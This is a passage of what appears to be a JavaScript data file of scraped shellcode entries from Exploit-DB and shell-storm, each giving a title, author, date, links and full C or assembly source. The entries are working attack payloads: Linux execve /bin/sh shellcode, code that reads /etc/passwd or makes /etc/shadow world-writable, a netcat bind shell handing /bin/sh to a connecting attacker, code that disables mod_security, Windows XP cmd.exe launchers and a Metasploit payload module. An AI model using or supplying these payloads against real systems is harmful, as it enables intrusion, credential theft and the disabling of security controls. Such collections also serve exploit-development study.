%d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)(); ", "", "return 0;", "}"]},
{"Title": "Linux/i686 - pacman -R <package> Shellcode (59 bytes)", "Author": "Jonathan Salwan", "Published": ": 2010-01-24", "Platform": "Linux_x86", "Download": "https://old.exploit-db.com/download/13602.c", "View": "https://old.exploit-db.com/raw/13602/", "code": ["/*", " Title\t: Linux i686 - pacman -R <package> - 59 bytes", " Author\t: Jonathan Salwan", " Mail\t: submit [!] shell-storm.org", " Web\t: http://www.shell-storm.org", "", " Pacman is a software package manager, developed as part of the Arch Linux distribution.", " With this shellcode you can remove the packages.", "", "\t! DataBase of Shellcodes and you can share your shellcodes : http://www.shell-storm.org/shellcode/ ! ", "", "", " Disassembly of section .text:", "", " 08048054 <.text>:", " 8048054:\t31 c0                \txor    %eax,%eax", " 8048056:\t31 db                \txor    %ebx,%ebx", " 8048058:\t31 c9                \txor    %ecx,%ecx", " 804805a:\t31 d2                \txor    %edx,%edx", " 804805c:\t31 f6                \txor    %esi,%esi", " 804805e:\t52                   \tpush   %edx", " 804805f:\t68 61 61 61 61       \tpush   $0x61616161", " 8048064:\t89 e6                \tmov    %esp,%esi", " 8048066:\t52                   \tpush   %edx", " 8048067:\t66 68 2d 52          \tpushw  $0x522d", " 804806b:\t89 e1                \tmov    %esp,%ecx", " 804806d:\t52                   \tpush   %edx", " 804806e:\t68 63 6d 61 6e       \tpush   $0x6e616d63", " 8048073:\t68 6e 2f 70 61       \tpush   $0x61702f6e", " 8048078:\t68 72 2f 62 69       \tpush   $0x69622f72", " 804807d:\t68 2f 2f 75 73       \tpush   $0x73752f2f", " 8048082:\t89 e3                \tmov    %esp,%ebx", " 8048084:\t52                   \tpush   %edx", " 8048085:\t56                   \tpush   %esi", " 8048086:\t51                   \tpush   %ecx", " 8048087:\t53                   \tpush   %ebx", " 8048088:\t89 e1                \tmov    %esp,%ecx", " 804808a:\tb0 0b                \tmov    $0xb,%al", " 804808c:\t99                   \tcltd   ", " 804808d:\tcd 80                \tint    $0x80", "", "*/", "", "", "#include <stdio.h>", "", "int main(void)", "{", "char shellcode[] = \t", "", "\t\t\t\"\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x31\"", "\t\t\t\"\\xd2\\x31\\xf6\\x52\\x68\"", "\t\t\t\"\\x61\\x61\\x61\\x61\"\t\t// <- package is \"aaaa\", you can change it.", "\t\t\t\"\\x89\\xe6\\x52\\x66\\x68\\x2d\\x52\"", "\t\t\t\"\\x89\\xe1\\x52\\x68\\x63\\x6d\\x61\"", "\t\t\t\"\\x6e\\x68\\x6e\\x2f\\x70\\x61\\x68\"", "\t\t\t\"\\x72\\x2f\\x62\\x69\\x68\\x2f\\x2f\"", "\t\t\t\"\\x75\\x73\\x89\\xe3\\x52\\x56\\x51\"", "\t\t\t\"\\x53\\x89\\xe1\\xb0\\x0b\\x99\\xcd\"", "\t\t\t\"\\x80\";", "", "       \tprintf(\"Length: %d\\n\",strlen(shellcode));", "\t(*(void(*)()) shellcode)(); ", "", "return 0;", "}"]},
{"Title": "Linux/x86 - execve(/bin/cat /etc/passwd) Shellcode (43 bytes)", "Author": "fb1h2s", "Published": ": 2010-02-09", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-571.php", "View": null, "code": ["#include <stdio.h>", "", "const char shellcode[]=\"\\x31\\xc0\" // xorl %eax,%eax", "\"\\x99\" // cdq", "\"\\x52\" // push edx", "\"\\x68\\x2f\\x63\\x61\\x74\" // push dword 0x7461632f", "\"\\x68\\x2f\\x62\\x69\\x6e\" // push dword 0x6e69622f", "\"\\x89\\xe3\" // mov ebx,esp", "\"\\x52\" // push edx", "\"\\x68\\x73\\x73\\x77\\x64\" // pu sh dword 0x64777373", "\"\\x68\\x2f\\x2f\\x70\\x61\" // push dword 0x61702f2f", "\"\\x68\\x2f\\x65\\x74\\x63\" // push dword 0x6374652f", "\"\\x89\\xe1\" // mov ecx,esp", "\"\\xb0\\x0b\" // mov $0xb,%al", "\"\\x52\" // push edx", "\"\\x51\" // push ecx", "\"\\x53\" // push ebx", "\"\\x89\\xe1\" // mov ecx,esp", "\"\\xcd\\x80\" ; // int 80h", "", "int main()", "{", "(*(void (*)()) shellcode)();", "", "return 0;", "}", "", "", "/*", "shellcode[]=\"\\x31\\xc0\\x99\\x52\\x68\\x2f\\x63\\x61\\x74\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x52\\x68\\x73\\x73\\x77\\x64\" \"\\x68\\x2f\\x2f\\x70\\x61\\x68\\x2f\\x65\\x74\\x63\\x89\\xe1\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\xcd\\x80\";", "*/"]},
{"Title": "Windows/x86 (XP SP3) (English) - cmd.exe Shellcode (26 bytes)", "Author": "Hellcode Research", "Published": ": 2010-02-10", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-572.php", "View": null, "code": ["/*", "", "26 Bytes Win32 Shellcode (cmd.exe) for XP SP3 English ", "Author: Hellcode Research || TCC (The Computer Cheats)", "http://tcc.hellcode.net", "memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob", "", "from murderkey: I love you merve lol      ", "from karak0rsan: fuck u \"ysmn\" lol || eternal love kubr4 || ", "notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]", "merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]", "", "Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community", "", "\"\\xc7\\x93\\xc2\\x77\" is the system address. (0x77c293c7) ", "You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)", "(Open MSVCRT.DLL via Dependency Walker, ", "find system function's address and MSVCRT's Preferred Base address", "system + preferred base = System Address ;] )", "", "*/", "", "#include <windows.h>", "#include <winbase.h>", "", "", "unsigned char hellcodenet[]=", "\"\\x8b\\xec\\x55\\x8b\\xec\"", "\"\\x68\\x65\\x78\\x65\\x2F\"", "\"\\x68\\x63\\x6d\\x64\\x2e\"", "\"\\x8d\\x45\\xf8\\x50\\xb8\"", "\"\\xc7\\x93\\xc2\\x77\"", "\"\\xff\\xd0\"", ";", "", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "(*ret)=(int)hellcodenet;", "return 0;", "}"]},
{"Title": "Windows/x86 (XP SP2) (Turkish) - cmd.exe Shellcode (26 bytes)", "Author": "Hellcode Research", "Published": ": 2010-02-10", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-573.php", "View": null, "code": ["/*", "", "26 Bytes Win32 Shellcode (cmd.exe) for XP SP2 Turkish ", "", "Author: Hellcode Research || TCC (The Computer Cheats)", "http://tcc.hellcode.net", "memberz: celil 'karak0rsan unuver , murderkey,  murat kaslioglu, bob", "", "from murderkey: I love you merve lol      ", "from karak0rsan: fuck u \"ysmn\" lol || eternal love kubr4 || ", "notebookumu calan hirsiz kurcalarsa l33t h4x0r olabilir ahahaha :]", "merak etme mkey, en kisa zamanda giden 0dayleri tekrar toplucam ;]", "", "", "Greetz: AhmetBSD aka L4M3R, GOBBLES and all blackhat community", "", "\"\\xc7\\x93\\xc1\\x77\" is the system address. (0x77c193c7) ", "You can change it if you use another XP. (e.g SP2 FR, SP3 Turkish etc.)", "(Open MSVCRT.DLL via Dependency Walker, ", "find system function's address and MSVCRT's Preferred Base address", "system + preferred base = System Address ;] )", "", "", "*/", "", "", "#include <windows.h>", "#include <winbase.h>", "", "", "unsigned char hellcodenet[]=", "\"\\x8b\\xec\\x55\\x8b\\xec\"", "\"\\x68\\x65\\x78\\x65\\x2F\"", "\"\\x68\\x63\\x6d\\x64\\x2e\"", "\"\\x8d\\x45\\xf8\\x50\\xb8\"", "\"\\xc7\\x93\\xc1\\x77\"", "\"\\xff\\xd0\"", ";", "", "int main ()", "{", "int *ret;", "ret=(int *)&ret+2;", "(*ret)=(int)hellcodenet;", "return 0;", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (8 bytes)", "Author": "JungHoon Shin", "Published": ": 2010-02-23", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-574.php", "View": null, "code": ["/*", "08048334 <main>:", " 8048334:\t99                   \tcltd", " 8048335:\t6a 0b                \tpush   $0xb", " 8048337:\t58                   \tpop    %eax", " 8048338:\t60                   \tpusha", " 8048339:\t59                   \tpop    %ecx", " 804833a:\tcd 80                \tint    $0x80", "", "using this code.", "", "step1. This code is compiled.", "step2. strace -x output binary", "step3. get execve args in strace result.", "step4. create link execve args on /bin/sh", "", "*/", "", "unsigned char sc[]=", "\"\\x99\\x6a\\x0b\\x58\\x60\\x59\\xcd\\x80\";", "int main()", "{", "\tvoid (*p)();", "\tp = sc;", "\tp();", "}", "", "have a nice day~", "", "thx~", "", "-- ", "INTO THE WORLD!"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (21 bytes) (2)", "Author": "ipv", "Published": ": 2010-02-27", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-575.php", "View": null, "code": ["/* execve /bin/sh - x86/linux - 21 bytes . zeroed argv[] / envp[]", "  ipv#oldschool@irc.worldnet.net ipv#backtrack-fr@irc.freenode.org", "  thanks : `ivan, milo, #oldschool crew", "*/", "", "int main(){", "", "char sc[] = \"\\x6a\\x0b\" // push byte +0xb", "\"\\x58\" // pop eax", "\"\\x99\" // cdq", "\"\\x52\" // push edx", "\"\\x68\\x2f\\x2f\\x73\\x68\" // push dword 0x68732f2f", "\"\\x68\\x2f\\x62\\x69\\x6e\" // push dword 0x6e69922f", "\"\\x89\\xe3\" // mov ebx, esp", "\"\\x31\\xc9\" // xor ecx, ecx", "\"\\xcd\\x80\"; // int 0x80", "", "((void (*)()) sc)();", "}", "", "/*", "sc[] = \"\\x6a\\x0b\\x58\\x99\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x31\\xc9\\xcd\\x80\"", "*/", "", "--", "ipv"]},
{"Title": "Windows (XP Home SP2) (English) - calc.exe Shellcode (37 bytes)", "Author": "Hazem mofeed", "Published": ": 2010-02-28", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-576.php", "View": null, "code": ["/*", " * Windows Xp Home edition SP2 english ( calc.exe ) 37 bytes shellcode", " * by: Hazem mofeed Aka Hakxer", " * penetration testing labs", " *   www.pentestlabs.com", " */", "", "char evil[] =", "\"\\xeb\\x16\\x5b\\x31\\xc0\\x50\\x53\\xbb\\x8d\\x15\\x86\\x7c\\xff\\xd3\\x31\\xc0\"", "\"\\x50\\xbb\\xea\\xcd\\x81\\x7c\\xff\\xd3\\xe8\\xe5\\xff\\xff\\xff\\x63\\x61\\x6c\"", "\"\\x63\\x2e\\x65\\x78\\x65\\x00\";", "", "int main(int argc, char **argv)", "{", "int (*shellcode)();", "shellcode = (int (*)()) evil;", "(int)(*shellcode)();", "}"]},
{"Title": "Windows (XP Home SP3) (English) - calc.exe Shellcode (37 bytes)", "Author": "Hazem mofeed", "Published": ": 2010-03-01", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-577.php", "View": null, "code": ["/*", "* Windows Xp Home edition SP3 english ( calc.exe ) 37 bytes shellcode", "* by: Hazem mofeed", "* The Shellcode: http://www.exploit-db.com/exploits/11598", "* Modified to working In SP3,", "* Home: www.pentestlabs.com", "* greetz: ProViDoR , ExH , rUnVirUs , Sinaritx , Data_fr34k3r , Br1ght D@rk", "*/", "", "char evil[] =", "\"\\xeb\\x16\\x5b\\x31\\xc0\\x50\\x53\\xbb\\x0d\\x25\\x86\\x7c\\xff\\xd3\\x31\\xc0\"", "\"\\x50\\xbb\\x12\\xcb\\x81\\x7c\\xff\\xd3\\xe8\\xe5\\xff\\xff\\xff\\x63\\x61\\x6c\"", "\"\\x63\\x2e\\x65\\x78\\x65\\x00\";", "", "int main(int argc, char **argv)", "{", "int (*shellcode)();", "shellcode = (int (*)()) evil;", "(int)(*shellcode)();", "}"]},
{"Title": "Linux/x86 - Disable modsecurity Shellcode (64 bytes)", "Author": "sekfault", "Published": ": 2010-03-04", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-578.php", "View": null, "code": [" /* sekfault@shellcode.com.ar - Goodfellas Security Research Team - 2010", " * /usr/sbin/a2dismod mod-security2 - disable modsecurity", " * 64 bytes", " *__asm__(", " *                \"xor %eax,%eax \\n\"", " *                 \"push %eax \\n\"", " *                 \"cdq \\n\"", " *                 \"push $0x646f6d73 \\n\"", " *                 \"push $0x69643261 \\n\"", " *                 \"push $0x2f6e6962 \\n\"", " *                 \"push $0x732f7273 \\n\"", " *                 \"push $0x752f2f2f \\n\"", " *                 \"mov %esp,%ebx \\n\"", " *                 \"push $0x32 \\n\"", " *                 \"push $0x79746972 \\n\"", " *                 \"push $0x75636573 \\n\"", " *                 \"push $0x2d646f6d \\n\"", " *                 \"mov %esp,%ecx \\n\"", " *                 \"xor %edx,%edx \\n\"", " *                 \"mov $0xb,%al \\n\"", " *                 \"push %edx \\n\"", " *                 \"push %ecx \\n\"", " *                 \"push %ebx \\n\"", " *                 \"mov %esp,%ecx \\n\"", " *                 \"mov %esp,%edx \\n\"", " *                 \"int $0x80 \\n\"", "                   );", " */", "char shellcode[]=\"\\x31\\xc0\\x50\\x99\\x68\\x73\\x6d\\x6f\\x64\\x68\\x61\\x32\\x64\\x69\\x68\\x62\\x69\\x6e\\x2f\\x68\\x73\\x72\\x2f\\x73\\x68\\x2f\\x2f\\x2f\\x75\\x89\\xe3\\x6a\\x32\\x68\\x72\\x69\\x74\\x79\\x68\\x73\\x65\\x63\\x75\\x68\\x6d\\x6f\\x64\\x2d\\x89\\xe1\\x31\\xd2\\xb0\\x0b\\x52\\x51\\x53\\x89\\xe1\\x89\\xe2\\xcd\\x80\";", "", "int main()", "{", "        (*(void(*)())shellcode)();", "        return 0;", "}"]}
]

const pag_10 = [{"Title": "Windows (XP Professional SP2) (Italian) - calc.exe Shellcode (36 bytes)", "Author": "Stoke", "Published": ": 2010-03-11", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-580.php", "View": null, "code": ["/*", "Title: Windows XP Professional SP2 ita calc.exe shellcode 36 bytes", "Type: Shellcode", "Author: Stoke", "Platform: win32", "Tested on: Windows XP Professional SP2 ita", "*/", "", "#include <stdio.h>", "#include <string.h>", "", "int main() {", "char shell[] = \"\\xeb\\x16\\x5b\\x31\\xc0\\x50\\x53\\xbb\"", "\"\\x8d\\x15\\x86\\x7c\\xff\\xd3\\x31\\xc0\"", "\"\\x50\\xbb\\xea\\xcd\\x81\\x7c\\xff\\xd3\"", "\"\\xe8\\xe5\\xff\\xff\\xff\\x63\\x61\\x6c\"", "\"\\x63\\x2e\\x65\\x78\\x65\";", "printf(\"Shellcode lenght %d\\n\", strlen(shell));", "getchar();", "((void (*)()) shell)();", "return 0;", "}"]},
{"Title": "Windows/x86 (XP SP2) - WinExec(write.exe) + ExitProcess Shellcode (16 bytes)", "Author": "czy", "Published": ": 2010-03-18", "Platform": "Windows_x86", "Download": "https://old.exploit-db.com/download/13642.asm", "View": "https://old.exploit-db.com/raw/13642/", "code": ["# Title: Win32 Mini HardCode WinExec&ExitProcess Shellcode 16 bytes", ";Test on xpsp2cn,no zero in shellcode,it will run write.exe()", ";---------------------------------------------", "push 7C808E9DH ;write ;68 xx xx xx xx ;program string in memory", "push 7C81CAA2H ;exitprocess ;68 xx xx xx xx", "push 7C86114DH ;winexec ;68 xx xx xx xx", "ret ;C3", ";--------------------------------------------"]},
{"Title": "Windows/x86 (XP SP3) (Russia) - WinExec(cmd.exe) + ExitProcess Shellcode (12 bytes)", "Author": "lord Kelvin", "Published": ": 2010-03-24", "Platform": "Windows_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-581.php", "View": null, "code": ["68 9D 61 F9 77  push 0x77C01345", "B8 C7 93 C1 77  mov eax,msvcrt.system", "FF D0           call eax", " ", "In msvcrt.dll at 0x77C01344 We have string \".cmd\", that's the trick.", "Code will work in WinXP SP3 Pro Rus, in other versions you'd better search", "the string and system(char*) address for yourself.", " ", "Coded via lord Kelvin."]},
{"Title": "Windows/x86 - MessageBox Shellcode (Generator) (Metasploit)", "Author": "corelanc0d3r", "Published": ": 2010-03-24", "Platform": "Windows_x86", "Download": null, "View": null, "code": ["##", "# $Id: messagebox.rb 4 2010-02-26 00:28:00:00Z corelanc0d3r & rick2600 $", "##", "#", "#  Installation instructions :", "#  Drop file in framework3/modules/payloads/singles/windows folder", "#", "# Usage :   ./msfpayload windows/messagebox TITLE=\"Corelan\" TEXT=\"Greetz to corelanc0d3r\" P", "#", "", "require 'msf/core'", "module Metasploit3", "", "include Msf::Payload::Windows", "include Msf::Payload::Single", "", "  def initialize(info = {})", "      super(update_info(info,", "       'Name'          => 'Windows Messagebox with custom title and text',", "       'Version'       => '$Revision: 4 $',", "       'Description'   => 'Spawns MessageBox with a customizable title & text',", "       'Author'        => [ 'corelanc0d3r - peter.ve[at]corelan.be', ", "                                'rick2600 - ricks2600[at]gmail.com' ],", "       'License'       => BSD_LICENSE,", "       'Platform'      => 'win',", "       'Arch'          => ARCH_X86,", "       'Privileged'    => false,", "       'Payload'       =>", "               {", "               'Offsets' => { },", "               'Payload' =>    \"\\xd9\\xeb\\x9b\\xd9\\x74\\x24\\xf4\\x31\"+", "                               \"\\xd2\\xb2\\x7a\\x31\\xc9\\x64\\x8b\\x71\"+", "                               \"\\x30\\x8b\\x76\\x0c\\x8b\\x76\\x1c\\x8b\"+", "                               \"\\x46\\x08\\x8b\\x7e\\x20\\x8b\\x36\\x38\"+", "                               \"\\x4f\\x18\\x75\\xf3\\x59\\x01\\xd1\\xff\"+", "                               \"\\xe1\\x60\\x8b\\x6c\\x24\\x24\\x8b\\x45\"+", "                               \"\\x3c\\x8b\\x54\\x05\\x78\\x01\\xea\\x8b\"+", "                               \"\\x4a\\x18\\x8b\\x5a\\x20\\x01\\xeb\\xe3\"+", "                               \"\\x37\\x49\\x8b\\x34\\x8b\\x01\\xee\\x31\"+", "                               \"\\xff\\x31\\xc0\\xfc\\xac\\x84\\xc0\\x74\"+", "                               \"\\x0a\\xc1\\xcf\\x0d\\x01\\xc7\\xe9\\xf1\"+", "                               \"\\xff\\xff\\xff\\x3b\\x7c\\x24\\x28\\x75\"+", "                               \"\\xde\\x8b\\x5a\\x24\\x01\\xeb\\x66\\x8b\"+", "                               \"\\x0c\\x4b\\x8b\\x5a\\x1c\\x01\\xeb\\x8b\"+", "                               \"\\x04\\x8b\\x01\\xe8\\x89\\x44\\x24\\x1c\"+", "                               \"\\x61\\xc3\\xb2\\x08\\x29\\xd4\\x89\\xe5\"+", "                               \"\\x89\\xc2\\x68\\x8e\\x4e\\x0e\\xec\\x52\"+", "                               \"\\xe8\\x9c\\xff\\xff\\xff\\x89\\x45\\x04\"+", "                               \"\\xbb\"", "                        }", "                        ))", "", "                # EXITFUNC : Only support Process and Thread :/", "                deregister_options('EXITFUNC')", "", "                # Register MessageBox options", "                register_options(", "                     [", "                      OptString.new('EXITFUNC', [ false, ", "              \"Only Process (default) or Thread are supported\",\"process\"]),", "                      OptString.new('TITLE', [ true, ", "                                   \"Messagebox Title (max 255 chars)\" ]),", "                      OptString.new('TEXT', [ true, ", "                                   \"Messagebox Text\" ])", "                      ], self.class)", "        end", "", "    #", "    # Constructs the payload", "    #", "   def generate", "      ", "     strExitFunc = datastore['EXITFUNC'] || \"process\"", "     strExitFuncHash = \"\\x7e\\xd8\\xe2\\x73\"   #ExitProcess()", "", "     strTitle = datastore['TITLE'] ", "      if (strTitle)", "  ", "       #ExitFunc", "       if (strExitFunc) then", "         strExitFunc=strExitFunc.downcase", "         if strExitFunc == \"thread\" then", "           strExitFuncHash=\"\\xEF\\xCE\\xE0\\x60\"   #ExitThread()", "         end ", "       end", "", "       #================Process Title==================================", "       strTitle=strTitle+\"X\"", "       iTitle=strTitle.length", "       if (iTitle < 256)", "         iNrLines=iTitle/4", "         iCheckChars = iNrLines * 4", "         strSpaces=\"\" ", "         iSniperTitle=iTitle-1", "         if iCheckChars != iTitle then", "           iTargetChars=(iNrLines+1)*4", "           while iTitle < iTargetChars", "             strSpaces+=\" \"         #add space", "             iTitle+=1", "           end", "         end", "         strTitle=strTitle+strSpaces   #title is now 4 byte aligned", "                                       #and string ends with X ", "                                       #at index iSniperTitle", "", "         #push Title to stack", "         #start at back of string", "         strPushTitle=\"\"", "         strLine=\"\"", "         icnt=strTitle.length-1", "         icharcnt=0", "         while icnt >= 0", "           thisChar=strTitle[icnt,1]", "           strLine=thisChar+strLine ", "           if icharcnt < 3", "            icharcnt+=1", "           else", "            strPushTitle=strPushTitle+\"h\"+strLine    #h = \\68 = push", "            strLine=\"\"", "            icharcnt=0", "           end", "           icnt=icnt-1", "         end", "", "         #generate opcode to write null byte ", "         strWriteTitleNull=\"\\x31\\xDB\\x88\\x5C\\x24\"", "         strWriteTitleNull += iSniperTitle.chr + \"\\x89\\xe3\"", "", "", "         #================Process Text===============================", "         #cut text into 4 byte push instructions", "         strText = datastore['TEXT']", "         strText=strText+\"X\"", "         iText=strText.length", "         iNrLines=iText/4", "         iCheckChars = iNrLines * 4", "         strSpaces=\"\"", "         iSniperText=iText-1", "         if iCheckChars != iText then", "           iTargetChars=(iNrLines+1)*4", "           while iText < iTargetChars", "               strSpaces+=\" \"         #add space", "               iText+=1", "           end", "         end", "         strText=strText+strSpaces   #text is now 4 byte aligned", "                                     #and string ends with X", "                                     #at index iSniperTitle", "", "        #push Text to stack", "        #start at back of string", "        strPushText=\"\"", "        strLine=\"\"", "        icnt=strText.length-1", "        icharcnt=0", "        while icnt >= 0", "          thisChar=strText[icnt,1]", "          strLine=thisChar+strLine  ", "          if icharcnt < 3", "             icharcnt+=1", "          else", "             strPushText=strPushText+\"h\"+strLine  #h = \\68 = push", "             strLine=\"\"", "             icharcnt=0", "          end", "          icnt=icnt-1", "        end", "", "        #generate opcode to write null byte", "        strWriteTextNull=\"\\x31\\xc9\\x88\\x4C\\x24\" ", "        strWriteTextNull += iSniperText.chr + \"\\x89\\xe1\"", "", "", "        #build payload", "        payload_data = module_info['Payload']['Payload']             ", "        payload_data += strExitFuncHash", "        payload_data += \"\\x87\\x1c\\x24\" ", "        payload_data += \"\\x52\\xe8\\x8b\\xff\\xff\\xff\\x89\\x45\"", "        payload_data += \"\\x08\\x68\\x6c\\x6c\\x20\\xff\\x68\\x33\"", "        payload_data += \"\\x32\\x2e\\x64\\x68\\x75\\x73\\x65\\x72\"", "        payload_data += \"\\x88\\x5c\\x24\\x0a\\x89\\xe6\\x56\\xff\"", "        payload_data += \"\\x55\\x04\\x89\\xc2\\x50\\xbb\\xa8\\xa2\"", "        payload_data += \"\\x4d\\xbc\\x87\\x1c\\x24\\x52\\xe8\\x5e\"", "        payload_data += \"\\xff\\xff\\xff\"", "        payload_data += strPushTitle + strWriteTitleNull ", "        payload_data += strPushText + strWriteTextNull", "        payload_data += \"\\x31\\xd2\\x52\"", "        payload_data += \"\\x53\\x51\\x52\\xff\\xd0\\x31\\xc0\\x50\"", "        payload_data += \"\\xff\\x55\\x08\"", "", "", "        return payload_data", "       else", "         raise ArgumentError, \"Title should be 255 characters or less\"", "       end", "     end ", "   end", "end"]},
{"Title": "Linux/x86 - Bind (13377/TCP) Netcat Shell Shellcode", "Author": "anonymous", "Published": ": 2010-04-02", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-804.php", "View": null, "code": ["linux x86 nc -lvve/bin/sh -p13377 shellcode", "This shellcode will listen on port 13377 using netcat and give /bin/sh to connecting attacker", "Author: Anonymous", "Site: http://chaossecurity.wordpress.com/", "Here is code written in NASM", "", "/////////////////////////////", "section .text", "\tglobal _start", "_start:", "xor eax,eax", "xor edx,edx", "push 0x37373333", "push 0x3170762d", "mov edx, esp", "push eax", "push 0x68732f6e", "push 0x69622f65", "push 0x76766c2d", "mov ecx,esp", "push eax", "push 0x636e2f2f", "push 0x2f2f2f2f", "push 0x6e69622f", "mov ebx, esp  ", "push eax", "push edx", "push ecx", "push ebx  ", "xor edx,edx", "mov  ecx,esp      ", "mov al,11", "int 0x80", "//////////////////////////////////", "And here is objdump from which you can see the shellcode", "", "//////////////////////////////////", "teo@teo-desktop ~ $ objdump -d a.out", "", "a.out:     file format elf32-i386", "", "", "Disassembly of section .text:", "", "08048060 <.text>:", " 8048060:\t31 c0                \txor    %eax,%eax", " 8048062:\t31 d2                \txor    %edx,%edx", " 8048064:\t68 33 33 37 37       \tpush   $0x37373333", " 8048069:\t68 2d 76 70 31       \tpush   $0x3170762d", " 804806e:\t89 e2                \tmov    %esp,%edx", " 8048070:\t50                   \tpush   %eax", " 8048071:\t68 6e 2f 73 68       \tpush   $0x68732f6e", " 8048076:\t68 65 2f 62 69       \tpush   $0x69622f65", " 804807b:\t68 2d 6c 76 76       \tpush   $0x76766c2d", " 8048080:\t89 e1                \tmov    %esp,%ecx", " 8048082:\t50                   \tpush   %eax", " 8048083:\t68 2f 2f 6e 63       \tpush   $0x636e2f2f", " 8048088:\t68 2f 2f 2f 2f       \tpush   $0x2f2f2f2f", " 804808d:\t68 2f 62 69 6e       \tpush   $0x6e69622f", " 8048092:\t89 e3                \tmov    %esp,%ebx", " 8048094:\t50                   \tpush   %eax", " 8048095:\t52                   \tpush   %edx", " 8048096:\t51                   \tpush   %ecx", " 8048097:\t53                   \tpush   %ebx", " 8048098:\t31 d2                \txor    %edx,%edx", " 804809a:\t89 e1                \tmov    %esp,%ecx", " 804809c:\tb0 0b                \tmov    $0xb,%al", " 804809e:\tcd 80                \tint    $0x80"]},
{"Title": "Linux/x86 - chmod 0666 /etc/shadow Shellcode (36 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-584.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "by Magnefikko", "14.04.2010", "magnefikko@gmail.com", "promhyl.oz.pl", "Subgroup: #PRekambr", "Name: 36 bytes chmod(\"/etc/shadow\", 0666) shellcode", "Platform: Linux x86", "", "chmod(\"/etc/shadow\", 0666);", "gcc -Wl,-z,execstack filename.c", "", "shellcode:", "", "\\xeb\\x12\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb1\\xb6\\xb5\\x01\\xb0\\x0f\\x89\\x53\\x0b\\xcd\\x80\\xe8\\xe9\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77", "", "*/", "", "", "int main(){", "char shell[] =", "\"\\xeb\\x12\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb1\\xb6\\xb5\\x01\\xb0\\x0f\\x89\\x53\\x0b\\xcd\\x80\\xe8\\xe9\\xff\\xff\\xff\\x2f\\x65\\x74\\x63\\x2f\\x73\\x68\\x61\\x64\\x6f\\x77\";", "printf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - execve(/bin/sh) Shellcode (25 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-585.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "by Magnefikko", "14.04.2010", "magnefikko@gmail.com", "promhyl.oz.pl", "Subgroup: #PRekambr", "Name: 25 bytes execve(\"/bin/sh\") shellcode", "Platform: Linux x86", "", "execve(\"/bin/sh\", 0, 0);", "gcc -Wl,-z,execstack filename.c", "", "shellcode:", "", "\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68", "", "*/", "", "", "int main(){", "char shell[] =", "\"\\xeb\\x0b\\x5b\\x31\\xc0\\x31\\xc9\\x31\\xd2\\xb0\\x0b\\xcd\\x80\\xe8\\xf0\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\";", "printf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "(*(void (*)()) shell)();", "}"]},
{"Title": "Linux/x86 - DoS Badger Game Shellcode (6 bytes)", "Author": "Magnefikko", "Published": ": 2010-04-14", "Platform": "Linux_x86", "Download": "http://shell-storm.org/shellcode/files/shellcode-586.php", "View": null, "code": ["#include <stdio.h>", "#include <string.h>", "", "/*", "by Magnefikko", "14.04.2010", "magnefikko@gmail.com", "promhyl.oz.pl", "Subgroup: #PRekambr", "Name: 6 bytes DoS-Badger-Game shellcode", "Platform: Linux x86", "", "pause()", "gcc -Wl,-z,execstack filename.c", "", "shellcode:", "", "\\x31\\xc0\\xb0\\x1d\\xcd\\x80", "", "*/", "", "", "int main(){", "char shell[] = \"\\x31\\xc0\\xb0\\x1d\\xcd\\x80\";", "printf(\"by Magnefikko\\nmagnefikko@gmail.com\\npromhyl.oz.pl\\n\\nstrlen(shell)", "= %d\\n\", strlen(shell));", "(*(void (*)()) shell)();", "}"]},
